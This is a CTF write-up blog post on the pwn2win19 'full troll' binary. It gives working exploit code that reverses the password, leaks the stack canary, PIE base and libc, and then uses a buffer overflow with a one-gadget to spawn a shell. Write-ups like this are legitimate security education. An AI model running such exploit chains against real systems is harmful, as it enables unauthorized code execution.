---
layout: post
title: pwn2win19 - full troll
date: 2019-11-20 00:00:00
categories: 
    - ctf
tags:
    - ctf
    - linux
    - x64
    - stack buffer overflow
    - ret2libc
    - binary exploitation
---

### Sources

[https://github.com/fachrioktavian/ctf-writeup/tree/master/pwn2win19/fulltroll](https://github.com/fachrioktavian/ctf-writeup/tree/master/pwn2win19/fulltroll)

### Summary

This challenge is from pwn2win19 ctf. I didn't join the ctf. Solve this challenge by scraping for the binary in ctftime and solve it locally.

#### Overview

The binary is a program which loop asking for password, if we get the right password it will print out the data inside `secret.txt`. If you think the simple way to solve this challenge is open `flag.txt`, you wrong :p. As the challenge's name is `full troll`, sure it's full of troll.

```terminal
❯ ./full_troll
Welcome my friend. Tell me your password.
a
Not even close!

Welcome my friend. Tell me your password.
b
Not even close!

Welcome my friend. Tell me your password.

```

Binary' protection:

```terminal
❯ checksec full_troll
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

#### The bugs

1. There is a buffer overflow vulnerability exists on a function that reads user input for variable `buf_password` as there is no check for buffer length.

    ```c
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
        int is_valid;
        char *v5;
        FILE *stream;
        char buf_password;
        char filename;
        unsigned __int64 canary;

        ... snip ...

                while ( 1 )
                {
                puts("Welcome my friend. Tell me your password.");
                fn_read_E5D(stdin, &buf_password); // vuln

        ... snip ...

        return 0LL;
        }
    }
    ```

    ```c
    __int64 __fastcall fn_read_E5D(FILE *stream, __int64 buffer)
    {
        char v3;
        unsigned int i;

        for ( i = 0; ; ++i )
        {
            v3 = fgetc(stream);
            if ( v3 == -1 || v3 == '\n' )
            break;
            *(buffer + i) = v3;
        }
        return i;
    }
    ```

#### Exploitation's Scenario

1. Reverse engineering program to get password value that it wants

2. Leaking canary value.

3. Defeating pie by leaking start address of program in `/proc/self/maps`.

4. Leaking libc using puts function

5. Calling single gadget to call system("/bin/sh")

### Exploitation

#### Helper

For cleaner exploit script, we use helper function. I use one gadget to trigger RCE later in stage 5.

```python
def sendpwd(r, cnt):
    r.recv()
    r.sendline(cnt)

r = process("./full_troll", aslr=1)
e = ELF("./full_troll", checksec=False)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
path_to_libc = '/lib/x86_64-linux-gnu/libc.so.6'
ogt = []
for offset in generate_one_gadget(path_to_libc):
    ogt.append(offset)
#gdb.attach(r, "b *$rebase(0xF4A)")
```

#### Stage 1. Reverse engineering password

There is logic function to check password whether it's right or wrong.

```c
signed __int64 __fastcall check_password_A53(__int64 a1)
{
  if ( strlen(a1) <= 22 )
    return 1LL;
  if ( (*a1 ^ *(a1 + 1)) == 0x3F
    && (*(a1 + 1) ^ *(a1 + 2)) == 0xB
    && (*(a1 + 2) ^ *(a1 + 3)) == 0x27
    && (*(a1 + 3) ^ *(a1 + 4)) == 0x33
    && (*(a1 + 4) ^ *(a1 + 5)) == 0x41
    && (*(a1 + 5) ^ *(a1 + 6)) == 0x4F
    && (*(a1 + 6) ^ *(a1 + 7)) == 0x3B
    && (*(a1 + 7) ^ *(a1 + 8)) == 0x1B
    && (*(a1 + 8) ^ *(a1 + 9)) == 0x21
    && (*(a1 + 9) ^ *(a1 + 10)) == 0x32
    && (*(a1 + 10) ^ *(a1 + 11)) == 0x73
    && (*(a1 + 11) ^ *(a1 + 12)) == 0x79
    && (*(a1 + 12) ^ *(a1 + 13)) == 0x2B
    && (*(a1 + 13) ^ *(a1 + 14)) == 0x3A
    && *(a1 + 14) == *(a1 + 15)
    && (*(a1 + 15) ^ *(a1 + 16)) == 2
    && (*(a1 + 16) ^ *(a1 + 17)) == 0x38
    && (*(a1 + 17) ^ *(a1 + 18)) == 0x1D
    && (*(a1 + 18) ^ *(a1 + 19)) == 3
    && (*(a1 + 19) ^ *(a1 + 20)) == 4
    && (*(a1 + 20) ^ *(a1 + 21)) == 0x49
    && (*(a1 + 21) ^ *(a1 + 22)) == 0x61
    && *(a1 + 22) == 0x58 )
  {
    return 0LL;
  }
  return 2LL;
}
```

we can reverse it to get the password:

```python
op = [0x3F,0xB,0x27,0x33,0x41,0x4F,0x3B,0x1B,0x21,0x32,0x73,0x79,0x2B,0x3A,2,0x38,0x1D,3,4,0x49,0x61,0x58]
password = []
max = len(op) - 1
password.append(op[max])
for i in range(0, len(op)):
    password.append(password[i] ^ op[max-1])
    max -= 1
d = []
for i in range(0, len(password)):
    d.append(chr(password[len(password)-1 -i]))
real_pwd = "".join(d)
real_pwd = real_pwd[1::]
real_pwd = real_pwd[0:14:] + "P" + real_pwd[14::]
```

#### Stage 2. Leaking canary

Later to do ret2libc, we need to bypass canary checking. So we will leak the canary and use it in our exploit.

```python
pad = "B"*8*4
pload_leak_canary = real_pwd.ljust(0x20, "A") + "C"*8 + pad + 'X'
sendpwd(r, pload_leak_canary)
r.recvuntil(pad)
canary = u64(r.recv(8)) - ord('X')
```

#### Stage 3. Leaking program base

The binary is protected by several mechanism including PIE that will randomizes base address for program segment in memory. We can overwrite filename variable in stack, make it point to `/proc/self/maps` and we leak pie base for program. Then we get address of `puts`' function, `puts`' GOT, `pop rdi, ret` gadget, and `main`. We still want to trigger RCE after program's `main`'s returned, so make program jump back to `main` function. 

```python
pload_leak_pie = real_pwd.ljust(0x20, "A") + "/proc/self/maps\x00"
sendpwd(r, pload_leak_pie)
p = "0x" + r.recvuntil("-")[:-1:]
e.address = int(p, 16)
puts = e.plt['puts']
got_puts = e.got['puts']
pop_rdi_ret = e.address + 0x10a3 #0x00000000000010a3 : pop rdi ; ret
main = e.address + 0xEAD
```

#### Stage 4. Leaking libc base

One gadget rce lies on libc segment,we need to leak libc's base address. We still want to trigger RCE after program's `main`'s returned, so make program jump back to `main` function.

```python
sc_leak_libc = p64(pop_rdi_ret) + p64(got_puts) + p64(puts) + p64(main)
pload_leak_libc = real_pwd.ljust(0x20, "A") + "C"*8 + pad + p64(canary) + "D"*8 + sc_leak_libc
sendpwd(r, pload_leak_libc)
pload_trigger_main_return = real_pwd.ljust(0x20, "A") + "\x00"*8
sendpwd(r, pload_trigger_main_return)
r.recvuntil("error")
l.address = u64(r.recvline()[:-1:].ljust(8, "\x00")) - l.symbols["puts"]
```

#### Stage 4. Triggering RCE

Using all information we have, just a simple poke to get RCE.

```python
sc_call_system = p64(l.address + ogt[1])
pload_rce = real_pwd.ljust(0x20, "A") + "C"*8 + pad + p64(canary) + "D"*8 + sc_call_system
sendpwd(r, pload_rce)
sendpwd(r, pload_trigger_main_return)
```

#### Pwned

```terminal
❯ python solve.py
[+] Starting local process './full_troll': pid 7926
[*] Stage 1 > Get the password
[+]         > password: VibEv7xCXyK8AjPPRjwtp9X
[*] Stage 2 > Leaking canary
[+]         > canary: 0x3fbac4c898134f00
[*] Stage 3 > Leaking program base
[+]         > program base: 0x5566f0372000, puts: 0x5566f0372840, puts GOT: 0x5566f0573f88, pop_rdi_ret gadget: 0x5566f03730a3, main: 0x5566f0372ead
[*] Stage 4 > Leaking libc base
[+]         > libc base: 0x7fbdf1368000, one gadget rce: 0x7fbdf147238c
[*] Stage 5 > Triggering RCE
[+] Pwned!
[*] Switching to interactive mode
$ uname -a
Linux fokt 5.0.0-31-generic #33~18.04.1-Ubuntu SMP Tue Oct 1 10:20:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
